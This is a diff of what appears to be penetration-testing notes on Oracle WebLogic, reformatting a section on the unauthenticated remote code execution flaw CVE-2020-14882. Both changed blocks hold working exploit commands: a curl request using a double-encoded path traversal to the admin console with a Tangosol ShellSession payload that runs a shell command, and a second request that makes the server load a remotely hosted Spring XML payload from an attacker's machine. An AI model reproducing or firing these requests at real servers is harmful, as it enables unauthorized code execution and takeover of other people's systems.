@@ -25,11 +25,12 @@ Then deploy on the web interface. First enter the deployment menu, second lock t
 
 Unauthenticated RCE CVE-2020-14882
 ==================================
-There are loads of other RCEs spanning 2017-2020 but this one is so easy and powerful it kinda renders all other obsolete.
+There are loads of other RCEs spanning 2017-2020 but this one is so easy and powerful it kinda renders all the other exploits obsolete.
 
 If Tangosol is present on the target (versions >=12 usually) then direct remote code execution is achieved:
-```
-curl -X POST 'http://target:7001/console/css/%252e%252e%252fconsole.portal' --data '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/rce');")'
+```bash
+curl -X POST 'http://target:7001/console/css/%252e%252e%252fconsole.portal'
+    --data '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/rce');")'
 ```
 
 Otherwise an additional malicious webserver hosting a XML paylod is needed, but RCE is achieved nonetheless.
@@ -48,8 +49,9 @@ Hosted XML file ```wl.xml```:
 </beans>
 ```
 
-```
-curl -X POST 'http://target:7001/console/css/%252e%252e%252fconsole.portal' --data '_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http://xx.xx.xx.xx/wl.xml%22)'
+```bash
+curl -X POST 'http://target:7001/console/css/%252e%252e%252fconsole.portal'
+    --data '_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http://xx.xx.xx.xx/wl.xml%22)'
 ```
 
 Of course, the WebLogic server needs to have network visibility on the hosted payload.
